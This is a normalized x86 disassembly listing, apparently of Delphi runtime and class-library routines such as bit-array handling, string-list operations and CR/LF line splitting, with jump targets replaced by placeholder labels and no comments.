call sub_40323c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_41a668
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_41a644
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4027b4
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402c58
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_4027d4
mov edx edi
mov eax ebp
call sub_41a65c
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4029b0
sub_41a70c
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_41a644
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_41a668
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_41a738
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_41a7b0
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax esi
call sub_41cea8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40323c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_41a7f0
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a8a6
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404034
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_40319c
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404200
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_40319c
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a8ad
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_41a8cc
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a961
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_40319c
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_404200
mov eax ebx
mov si 0xffff
call sub_403448
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a968
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov eax ebx
mov si 0xffff
call sub_403448
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403448
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_40431c
sub_41a973
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4034a0
mov eax ebx
mov si 0xffff
call sub_403448
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403448
push eax
lea eax [ ebx + 0x4 ]
call sub_4059cc
mov ecx eax
mov edx r-xdata
pop eax
call sub_403300
sub_41a9d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_41a9ee
mov eax eax
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_41aa0e
mov eax eax
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403300
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_41aa38
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_41aa58
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41aab2
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_41a320
call sub_40324c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_41aac0
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41b618
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a7b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_41aaf0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41ab14
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41ab38
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41abdf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41ac88
xor eax eax
push ebp
push sub_41abc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41abc9
mov eax [ ebp - 0x4 ]
call sub_41ad44
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_41abf0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41a7dc
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41ac88
xor eax eax
push ebp
push sub_41ac70
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ad44
retn
sub_41aca0
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41ad58
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_41acf8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_41b4b0
mov eax [ ebp - 0x8 ]
push eax
push sub_41b760
push ebp
call sub_41aca0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ad58
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41aded
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41adf4
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403fc0
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_4043a8
jne r-xdata
sub_41ae04
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_41ae00
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
jmp sub_4039d8
sub_41ae3c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41ae84
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405eac
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_41ae04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ae8b
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_41ae94
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41af6c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41ac88
xor eax eax
push ebp
push sub_41af4a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41af51
mov eax [ ebp - 0x4 ]
call sub_41ad44
retn
sub_41af88
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41afcd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_40445c
call sub_408b10
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41afd4
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_41afda
mov eax eax
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b0e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_404034
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_40408c
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b0ee
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403fc0
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_40425c
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_40425c
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_40425c
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4029b0
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4029b0
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_40425c
mov ebx eax
test ebx ebx
je r-xdata
sub_41b104
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41b17c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b183
lea eax [ ebp - 0xc ]
call sub_403f9c
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_41b190
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41b253
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_4044bc
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_41b7f0
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404184
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c5e4
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b25a
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403fc0
lea eax [ ebp - 0xc ]
call sub_403f9c
retn
sub_41b264
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_41b298
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41b2c6
mov eax eax
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41c32c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b310
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b317
mov eax [ ebp - 0x4 ]
call sub_40324c
retn
sub_41b31c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b3b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41ac88
xor eax eax
push ebp
push sub_41b39c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41be78
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_40408c
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b3a3
mov eax [ ebp - 0x4 ]
call sub_41ad44
retn
sub_41b3c6
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b469
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b470
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
mov eax [ ebp - 0x4 ]
call sub_41ac88
xor eax eax
push ebp
push sub_41b44c
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ad44
retn
sub_41b478
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41b4b0
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b554
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41e068
mov eax [ ebp - 0x4 ]
call sub_41ac88
xor eax eax
push ebp
push sub_41b52f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41d104
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41ed08
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b536
mov eax [ ebp - 0x4 ]
call sub_41ad44
retn
sub_41b560
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41c32c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b5ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b5b2
mov eax [ ebp - 0x4 ]
call sub_40324c
retn
sub_41b5b6
mov eax eax
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41b605
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_40425c
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41c0dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b60c
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_41b618
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_4059e4
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_41b64c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41b68f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404194
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b696
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_41b69c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b750
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41ac88
xor edx edx
push ebp
push sub_41b733
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b73a
mov eax [ ebp - 0x4 ]
call sub_41ad44
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_40408c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_41b760
push ebp
mov ebp esp
add esp 0xfffffff4
